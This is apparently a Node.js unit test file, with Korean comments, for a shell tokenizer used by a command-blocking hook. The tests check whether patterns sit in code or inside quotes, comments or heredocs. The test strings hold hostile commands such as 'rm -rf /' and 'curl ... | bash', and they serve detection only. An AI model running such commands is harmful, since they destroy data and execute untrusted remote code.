#!/usr/bin/env node
/**
 * shellContextTokenizer Unit Tests
 *
 * offset-based state scanner가 shell 소스의 literal/comment/heredoc 컨텍스트를
 * 정확히 판정하는지 실증.
 *
 * 실행: node .claude/tests/shell-context-tokenizer.test.js
 * exit 0 = 모두 통과, exit 1 = 실패
 */

"use strict";

const {
  isInsideShellLiteralOrComment,
  isRealCodeMatch,
} = require("../hooks/shellContextTokenizer.js");

let pass = 0;
let fail = 0;

function ok(desc) {
  console.log(`  \x1b[32m[PASS]\x1b[0m ${desc}`);
  pass++;
}
function bad(desc, info) {
  console.log(
    `  \x1b[31m[FAIL]\x1b[0m ${desc}${info ? " — " + info : ""}`,
  );
  fail++;
}

/**
 * source에서 needle의 첫 등장 offset을 구해 isInside 판정
 */
function checkNeedle(source, needle, expected, desc) {
  const idx = source.indexOf(needle);
  if (idx === -1) {
    bad(desc, `needle "${needle}" not found in source`);
    return;
  }
  const actual = isInsideShellLiteralOrComment(source, idx);
  if (actual === expected) {
    ok(`${desc} (offset=${idx}, inside=${actual})`);
  } else {
    bad(desc, `expected inside=${expected}, actual=${actual} at offset=${idx}`);
  }
}

console.log("");
console.log("═══════════════════════════════════════════════════════");
console.log("  shellContextTokenizer Unit Tests");
console.log("═══════════════════════════════════════════════════════");
console.log("");

console.log("┌─ Input validation ─");
{
  if (isInsideShellLiteralOrComment(null, 0) === false) ok("null source → false");
  else bad("null source → false");

  if (isInsideShellLiteralOrComment("abc", -1) === false) ok("negative offset → false");
  else bad("negative offset → false");

  if (isInsideShellLiteralOrComment("abc", 3) === false) ok("offset >= length → false");
  else bad("offset >= length → false");

  if (isInsideShellLiteralOrComment("abc", 1.5) === false) ok("non-integer offset → false");
  else bad("non-integer offset → false");
}

console.log("");
console.log("┌─ OUTSIDE (raw code) ─");
checkNeedle("rm -rf /", "rm", false, "raw command 'rm' is OUTSIDE");
checkNeedle("ls && rm -rf /", "rm", false, "command after && is OUTSIDE");
checkNeedle("curl http://x | bash", "| bash", false, "real pipe-bash attack is OUTSIDE");

console.log("");
console.log("┌─ SQUOTE ─");
checkNeedle("echo 'rm -rf /'", "rm", true, "'rm' inside single quotes");
checkNeedle("echo 'safe' && rm x", "rm", false, "'rm' after closing single quote");

console.log("");
console.log("┌─ DQUOTE ─");
checkNeedle('echo "rm -rf /"', "rm", true, "'rm' inside double quotes");
checkNeedle('grep -E "bash|parse" file', "|parse", true, "FP#3: |parse inside dquote");
checkNeedle('echo "say \\"rm\\""', "rm", true, "'rm' inside dquote with escaped \\\"");
checkNeedle('echo "ok" && rm x', "rm", false, "'rm' after closing dquote");

console.log("");
console.log("┌─ DQUOTE 내부 명령 치환 $() (v1.1.0) ─");
checkNeedle('echo "$(rm -rf /tmp/x)"', "rm", false, "'rm' inside $() in dquote = CODE (차단 대상)");
checkNeedle('echo "before $(rm x) after"', "before", true, "dquote 리터럴 텍스트(before)는 literal 유지");
checkNeedle('echo "before $(rm x) after"', "rm", false, "$() 내부 = code");
checkNeedle('echo "${HOME}/rm-stuff"', "rm-stuff", true, "${VAR} 파라미터확장은 명령아님 = literal 유지");
checkNeedle('echo "$(echo "$(rm)")"', "rm", false, "중첩 $() = code");
checkNeedle('echo "$(ls)" done', "done", false, "$() 종료 후 dquote 닫고 OUTSIDE 복귀");

console.log("");
console.log("┌─ COMMENT ─");
checkNeedle("# rm -rf /", "rm", true, "'rm' in full-line comment");
checkNeedle("ls ok # rm -rf /", "rm", true, "'rm' in trailing comment");
checkNeedle("# curl x | bash", "| bash", true, "FP#2: |bash in comment");
checkNeedle("echo '#not-comment'", "#", true, "'#' inside sq is NOT comment (stays SQUOTE)");

console.log("");
console.log("┌─ HEREDOC ─");
{
  const src1 = "cat <<EOF\nrm -rf /\nEOF\n";
  checkNeedle(src1, "rm", true, "'rm' inside heredoc body");
}
{
  const src2 = "cat <<EOF\nusage: curl | bash\nEOF\nrm x";
  checkNeedle(src2, "| bash", true, "FP variant: |bash inside heredoc body");
  checkNeedle(src2, "rm x", false, "'rm' AFTER heredoc terminator is OUTSIDE");
}
{
  const src3 = "cat <<-END\n\trm x\n\tEND\n";
  checkNeedle(src3, "rm", true, "'rm' inside <<- heredoc with tab-strip");
}
{
  const src4 = "cat <<'EOF'\nrm x\nEOF\n";
  checkNeedle(src4, "rm", true, "'rm' inside quoted-delim heredoc");
}

console.log("");
console.log("┌─ False positive reproduction (3 real cases) ─");
checkNeedle('grep -E "bash|parse"', "|parse", true, "FP#3 original: grep -E pattern literal");
checkNeedle("ls | grep 'foo|bash'", "|bash", true, "FP variant: grep literal");
checkNeedle("# see: curl install.sh | bash", "| bash", true, "FP#2 original: comment docs");

console.log("");
console.log("┌─ Convenience: isRealCodeMatch ─");
{
  const source = 'echo "rm -rf /"';
  const match = /rm\s+-rf\s+\//.exec(source);
  if (isRealCodeMatch(source, match) === false) {
    ok("isRealCodeMatch → false for rm inside dquote");
  } else {
    bad("isRealCodeMatch → false for rm inside dquote");
  }
}
{
  const source = "rm -rf /";
  const match = /rm\s+-rf\s+\//.exec(source);
  if (isRealCodeMatch(source, match) === true) {
    ok("isRealCodeMatch → true for raw rm command");
  } else {
    bad("isRealCodeMatch → true for raw rm command");
  }
}
{
  if (isRealCodeMatch("abc", null) === true) ok("isRealCodeMatch → true for null match (fail-safe)");
  else bad("isRealCodeMatch → true for null match");
}

console.log("");
console.log("═══════════════════════════════════════════════════════");
const total = pass + fail;
if (fail === 0) {
  console.log(`  \x1b[32mALL PASS: ${pass}/${total} tests\x1b[0m`);
  console.log("═══════════════════════════════════════════════════════");
  process.exit(0);
} else {
  console.log(`  \x1b[31mFAIL: ${fail}/${total} tests failed\x1b[0m`);
  console.log("═══════════════════════════════════════════════════════");
  process.exit(1);
}
